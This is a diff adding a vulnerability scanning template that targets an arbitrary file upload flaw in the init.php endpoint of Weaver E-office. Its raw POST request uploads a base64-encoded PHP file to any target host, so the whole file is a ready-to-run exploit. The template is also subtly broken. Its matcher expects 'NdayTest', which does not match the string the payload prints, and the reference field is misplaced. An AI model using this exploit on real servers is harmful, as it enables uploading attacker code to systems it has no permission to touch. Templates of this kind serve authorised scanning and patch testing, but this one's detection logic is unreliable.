@@ -1,0 +1,28 @@
+id: weaver-e-office-init-upload
+
+info:
+  name: 泛微 E-office init.php 组件文件上传漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    该漏洞允许攻击者通过 /init.php 接口实现任意文件上传
+      影响版本：泛微 E-office 未明确定义版本
+      reference:
+        - https://example.com/advisory/2023-012
+  tags: 泛微
+
+http:
+- raw:
+  - |
+    POST /E-mobile/App/init.php HTTP/1.1
+    Host: {{Hostname}}
+
+    m=common_Common_Flow&f=flowDo&diff=feedback&RUN_ID=1&USER_ID=1&CONTENT=1&FLOW_ID=1&upload_file=PD9waHAgZWNobyAnRHVkZVN1aXRlJzsgdW5saW5rKF9fRklMRV9fKTsgPz4=&file_name=NTest.php
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
